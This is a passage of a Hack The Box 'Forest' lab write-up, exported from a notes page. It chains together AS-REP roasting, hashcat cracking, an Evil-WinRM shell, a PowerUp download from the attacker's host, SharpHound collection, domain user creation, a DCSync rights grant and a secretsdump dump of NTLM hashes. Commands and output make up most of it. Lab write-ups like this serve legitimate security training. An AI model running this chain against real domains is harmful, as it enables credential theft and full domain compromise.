+[E] Couldn&#x27;t get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
+
+
+ ===============================( Getting printer info for 10.10.10.161 )===============================
+
+do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
+
+
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="191d1b9f-8847-81f7-9c9d-dba5747a5c0b" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Forest]
+└─$ smbclient -L 10.10.10.161  
+Password for [WORKGROUP\drroot]:
+Anonymous login successful
+
+	Sharename       Type      Comment
+	---------       ----      -------
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.10.161 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="191d1b9f-8847-811a-96ae-f5da830fedfe" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Forest]
+└─$ netexec smb 10.10.10.161
+SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
+ 
+</code></pre><p id="191d1b9f-8847-815d-a229-d88fa6dee38f" class="">
+</p><h2 id="191d1b9f-8847-813f-895b-fa6b6e906df1" class="">Findings</h2><ul id="191d1b9f-8847-815a-8ee3-fb56e4e52ae3" class="bulleted-list"><li style="list-style-type:disc">Possible Microsoft Exchange exploit</li></ul><ul id="195d1b9f-8847-8089-8806-ee7271c0b1b2" class="bulleted-list"><li style="list-style-type:disc">Users</li></ul><h1 id="191d1b9f-8847-817d-b83c-d5c2e0ed7461" class="">User</h1><h3 id="197d1b9f-8847-80aa-8d60-e4d8dae6941d" class="">Try with preauth kerberos attack</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="197d1b9f-8847-808f-8f92-fb0053a8c483" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Forest]
+└─$ impacket-GetNPUsers -no-pass -dc-ip 10.10.10.161 -usersfile users.txt htb/ -format hashcat
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
+  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
+[-] User sebastien doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set
+[-] User lucinda doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$svc-alfresco@HTB:a53f1379a65c39146fe4308203cd1988$f43dae7b39e13b2d46f38c2d6f12e42b27d47b45154321f605a7f36eddf9e0d19e1e47ba1d8f8dbf83ec4af734ccdc4be26bb435ec99770840365a5a5e6d42d6daf8c39ac615a147fcd8a4246625c3e34aa02455cd3aec84861a7231edf7166338b44b02bee92f3eebdb2411692d042597253c3c7757395d2bda3f8e3bc0a9cddecb73242febacda1dc7e2df9f726545b4b08599f756a098316741dc32eebaa9dc55e420562b42c8b3b120ac09111013a58fb79c87e6c5a218098a9f29e91b3f02bff486c508aa4e667b8eb70e5b5a51d6a226cdbea68ca98a1ec4d60c4b5baf
+[-] User andy doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set
+[-] User mark doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set
+[-] User santi doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set
+</code></pre><h3 id="197d1b9f-8847-80dc-a85e-d0339477d0b6" class="">Decrypt</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="197d1b9f-8847-8058-9c82-f187c3804586" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Forest]
+└─$ hashcat -m 18200  -a 0 hash.txt /usr/share/wordlists/rockyou.txt                   
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i7-11700F @ 2.50GHz, 6925/13915 MB (2048 MB allocatable), 8MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 2 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+$krb5asrep$23$svc-alfresco@HTB:a53f1379a65c39146fe4308203cd1988$f43dae7b39e13b2d46f38c2d6f12e42b27d47b45154321f605a7f36eddf9e0d19e1e47ba1d8f8dbf83ec4af734ccdc4be26bb435ec99770840365a5a5e6d42d6daf8c39ac615a147fcd8a4246625c3e34aa02455cd3aec84861a7231edf7166338b44b02bee92f3eebdb2411692d042597253c3c7757395d2bda3f8e3bc0a9cddecb73242febacda1dc7e2df9f726545b4b08599f756a098316741dc32eebaa9dc55e420562b42c8b3b120ac09111013a58fb79c87e6c5a218098a9f29e91b3f02bff486c508aa4e667b8eb70e5b5a51d6a226cdbea68ca98a1ec4d60c4b5baf:s3rvice
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+Hash.Target......: $krb5asrep$23$svc-alfresco@HTB:a53f1379a65c39146fe4...4b5baf
+Time.Started.....: Mon Feb 10 23:15:25 2025 (1 sec)
+Time.Estimated...: Mon Feb 10 23:15:26 2025 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  3127.2 kH/s (1.62ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 4087808/14344385 (28.50%)
+Rejected.........: 0/4087808 (0.00%)
+Restore.Point....: 4079616/14344385 (28.44%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: s9039554h -&gt; s2704081
+Hardware.Mon.#1..: Util: 59%
+
+Started: Mon Feb 10 23:15:24 2025
+Stopped: Mon Feb 10 23:15:28 2025
+</code></pre><h3 id="197d1b9f-8847-80b8-8b52-f31dc7dd8a7f" class="">Flag</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="197d1b9f-8847-8023-ad7c-fd82e0fbe415" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Forest]
+└─$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p &#x27;s3rvice&#x27;
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; cd ../Desktop
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop&gt; type user.txt
+54809b1bf053b89df49a7dcf52f74446
+</code></pre><p id="191d1b9f-8847-812e-a33a-e89438296ec0" class="">
+</p><p id="191d1b9f-8847-813a-957b-f2fd02d288ec" class="">
+</p><p id="191d1b9f-8847-8124-af4f-df011d811ac8" class="">
+</p><p id="191d1b9f-8847-816e-9634-e40901d0cfed" class="">
+</p><h1 id="191d1b9f-8847-81d5-9b5f-e780cbf0a1c3" class="">Root</h1><h3 id="197d1b9f-8847-8087-baa6-eb38dfd79ee2" class="">Try SPN</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="197d1b9f-8847-804b-bf96-f4c7e1059a38" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">──(drroot㉿drroot)-[~/Desktop/.htb/Forest]
+└─$ impacket-GetUserSPNs -request -dc-ip 10.10.10.161 &quot;htb.local/svc-alfresco:s3rvice&quot; -save -outputfile TGS.txt
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+No entries found!
+</code></pre><h3 id="198d1b9f-8847-800d-8cb2-dbcde0a95af6" class="">Search for privilege escalation</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="198d1b9f-8847-80cf-9282-ee1d43628ec9" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; powershell -c wget http://10.10.14.23:8000/PowerUp.ps1 -Outfile PowerUp.ps1
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; Import-Module .\PowerUp.ps1
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; Invoke-AllChecks
+Access denied 
+At C:\Users\svc-alfresco\Documents\PowerUp.ps1:2066 char:21
++     $VulnServices = Get-WmiObject -Class win32_service | Where-Object ...
++                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
+    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand
+Access denied 
+At C:\Users\svc-alfresco\Documents\PowerUp.ps1:2133 char:5
++     Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pat ...
++     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
+    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand
+Cannot open Service Control Manager on computer &#x27;.&#x27;. This operation might require other privileges.
+At C:\Users\svc-alfresco\Documents\PowerUp.ps1:2189 char:5
++     Get-Service | Test-ServiceDaclPermission -PermissionSet &#x27;ChangeCo ...
++     ~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [Get-Service], InvalidOperationException
+    + FullyQualifiedErrorId : System.InvalidOperationException,Microsoft.PowerShell.Commands.GetServiceCommand
+
+
+ModifiablePath    : C:\Users\svc-alfresco\AppData\Local\Microsoft\WindowsApps
+IdentityReference : HTB\svc-alfresco
+Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
+%PATH%            : C:\Users\svc-alfresco\AppData\Local\Microsoft\WindowsApps
+Name              : C:\Users\svc-alfresco\AppData\Local\Microsoft\WindowsApps
+Check             : %PATH% .dll Hijacks
+AbuseFunction     : Write-HijackDll -DllPath &#x27;C:\Users\svc-alfresco\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll&#x27;
+
+
+</code></pre><h3 id="198d1b9f-8847-8079-b384-e172c7c65ece" class="">But nothing… Let’s try with Bloodhound</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="198d1b9f-8847-8054-86ed-e166728a7ca3" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; upload SharpHound.exe
+                                        
+Info: Uploading /home/drroot/Desktop/.htb/tools/windows/sharphound/SharpHound.exe to C:\Users\svc-alfresco\Documents\SharpHound.exe
+                                        
+Data: 1395368 bytes of 1395368 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; .\SharpHound.exe --domain htb.local --ldapusername svc-alfresco --ldappassword s3rvice --CollectionMethods all
+2025-02-11T21:56:35.7946721-08:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
+2025-02-11T21:56:35.9665482-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2025-02-11T21:56:35.9977979-08:00|INFORMATION|Initializing SharpHound at 9:56 PM on 2/11/2025
+2025-02-11T21:56:36.1540594-08:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for htb.local : FOREST.htb.local
+2025-02-11T21:56:36.5290605-08:00|INFORMATION|Loaded cache with stats: 118 ID to type mappings.
+ 118 name to SID mappings.
+ 1 machine sid mappings.
+ 2 sid to domain mappings.
+ 0 global catalog mappings.
+2025-02-11T21:56:36.5290605-08:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2025-02-11T21:56:36.8727968-08:00|INFORMATION|Beginning LDAP search for htb.local
+2025-02-11T21:56:36.9509249-08:00|INFORMATION|Producer has finished, closing LDAP channel
+2025-02-11T21:56:36.9509249-08:00|INFORMATION|LDAP channel closed, waiting for consumers
+2025-02-11T21:57:07.5447533-08:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 43 MB RAM
+2025-02-11T21:57:22.0291354-08:00|INFORMATION|Consumers finished, closing output channel
+2025-02-11T21:57:22.0603863-08:00|INFORMATION|Output channel closed, waiting for output task to complete
+Closing writers
+2025-02-11T21:57:22.1541352-08:00|INFORMATION|Status: 161 objects finished (+161 3.577778)/s -- Using 45 MB RAM
+2025-02-11T21:57:22.1541352-08:00|INFORMATION|Enumeration finished in 00:00:45.2920276
+2025-02-11T21:57:22.2478887-08:00|INFORMATION|Saving cache with stats: 118 ID to type mappings.
+ 118 name to SID mappings.
+ 1 machine sid mappings.
+ 2 sid to domain mappings.
+ 0 global catalog mappings.
+2025-02-11T21:57:22.2478887-08:00|INFORMATION|SharpHound Enumeration Completed at 9:57 PM on 2/11/2025! Happy Graphing!
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; dir
+
+
+    Directory: C:\Users\svc-alfresco\Documents
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        2/11/2025   9:57 PM          18657 20250211215721_BloodHound.zip
+-a----        2/11/2025   9:41 PM          99990 acls.csv
+-a----        2/11/2025   9:41 PM           8904 BloodHound.bin
+-a----        2/11/2025   9:41 PM            364 computer_props.csv
+-a----        2/11/2025   9:41 PM            355 container_gplinks.csv
+-a----        2/11/2025   9:41 PM           6788 container_structure.csv
+-a----        2/11/2025   9:41 PM           4302 group_membership.csv
+-a----        2/11/2025   9:41 PM            185 local_admins.csv
+-a----        2/11/2025   9:57 PM          19695 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
+-a----        2/11/2025   6:15 PM         600580 PowerUp.ps1
+-a----        2/11/2025   9:56 PM        1046528 SharpHound.exe
+-a----        2/11/2025   9:41 PM           5579 user_props.csv
+
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; download 20250211215721_BloodHound.zip
+
+</code></pre><h3 id="198d1b9f-8847-8021-83a6-d7617b346b0e" class="">Bloodhound</h3><figure id="198d1b9f-8847-8027-8d19-c0457803b9a5" class="image"><a href="../img/Forest/image.png"><img style="width:709.984375px" src="../img/Forest/image.png"/></a></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="198d1b9f-8847-80fe-aacb-ebf2d87f4634" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">Member of Account_creators
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                           Attributes
+========================================== ================ ============================================= ==================================================
+Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Account Operators                  Alias            S-1-5-32-548                                  Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+HTB\Privileged IT Accounts                 Group            S-1-5-21-3072663084-364016917-1341370565-1149 Mandatory group, Enabled by default, Enabled group
+HTB\Service Accounts                       Group            S-1-5-21-3072663084-364016917-1341370565-1148 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
+</code></pre><h3 id="198d1b9f-8847-80a7-82ed-dea0c96dba78" class="">1.- With <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators">Account_Operator</a> I can create users and add it into groups</h3><h3 id="198d1b9f-8847-8007-955e-ff22f9963c62" class="">2.- Create user and add it into <a href="https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md">Exchange Windows Permissions</a> and elevate privs</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="198d1b9f-8847-804d-9d4a-d3641bd66137" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net user /domain drroot drroot! /add
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net group /domain &quot;Exchange Windows Permissions&quot; drroot /add
+</code></pre><h3 id="198d1b9f-8847-8092-9f31-c772832998bd" class="">Then, add it dcsync function</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="198d1b9f-8847-8007-a35a-cd6c248b14b1" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; Import-Module .\PowerView.ps1
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; $SecPassword = ConvertTo-SecureString &#x27;drroot!&#x27; -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; $Cred = New-Object System.Management.Automation.PSCredential(&#x27;htb.local\drroot&#x27;, $SecPassword)
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; Add-DomainObjectAcl -Credential $Cred -TargetIdentity htb.local -PrincipalIdentity drroot -Rights DCSync
+
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="198d1b9f-8847-802c-b99a-fbff1152c9cd" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">──(drroot㉿drroot)-[~/Desktop/.htb/Forest]
+└─$ python3 DCSync.py -dc 10.10.10.161 -t &#x27;CN=drroot,CN=Users,DC=htb,DC=local&#x27; &#x27;htb.local\drroot:drroot!&#x27;
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Starting DCSync Attack against CN=drroot,CN=Users,DC=htb,DC=local
+[*] Initializing LDAP connection to 10.10.10.161
+[*] Using htb.local\drroot account with password ***
+[*] LDAP bind OK
+[*] Initializing domainDumper()
+[*] Initializing LDAPAttack()
+[*] Querying domain security descriptor
+[*] Success! User drroot now has Replication-Get-Changes-All privileges on the domain
+[*] Try using DCSync with secretsdump.py and this user :)
+[*] Saved restore state to aclpwn-20250212-014929.restore
+                                                                                                    
+┌──(drroot㉿drroot)-[~/Desktop/.htb/Forest]
+└─$ impacket-secretsdump htb.local/drroot:&#x27;drroot!&#x27;@10.10.10.161
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
